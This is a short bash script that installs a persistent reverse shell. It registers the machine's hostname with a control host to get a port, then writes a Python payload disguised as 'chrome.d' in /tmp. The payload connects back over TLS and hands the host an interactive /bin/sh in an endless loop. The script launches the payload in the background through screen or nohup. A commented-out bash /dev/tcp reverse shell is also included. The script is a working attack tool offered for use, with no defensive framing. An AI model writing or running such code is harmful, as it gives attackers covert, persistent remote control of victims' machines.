#!/bin/bash

FILENAME=chrome.d
HOST=localhost
PORT=$(nice curl http://$HOST/port -X POST --data "hostname=$(hostname)")

mkdir -p /tmp/lolz
cd /tmp/lolz

# cat>lolz<<EOF
# #!/bin/bash

# while true; do 
#     /bin/bash -i >& /dev/tcp/$HOST/$PORT 0>&1
# done
# EOF

cat>$FILENAME<<EOF
#!`which python`
import socket,subprocess,os,ssl

context = ssl.SSLContext(ssl.PROTOCOL_TLS)
context.verify_mode = ssl.CERT_REQUIRED
context.check_hostname = True
context.load_default_certs()

while True:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    
    ssl_sock = context.wrap_socket(s, server_hostname='$HOST')
    ssl_sock.connect(('$HOST', $PORT))
    
    os.dup2(ssl_sock.fileno(), 0)
    os.dup2(ssl_sock.fileno(), 1)
    os.dup2(ssl_sock.fileno(), 2)
    p=subprocess.call(["/bin/sh","-i"]);
EOF

chmod +x $FILENAME

if which screen &> /dev/null; then
    # screen found
    screen -d ./$FILENAME
else
    # lol no screen
    nohup ./$FILENAME &
fi


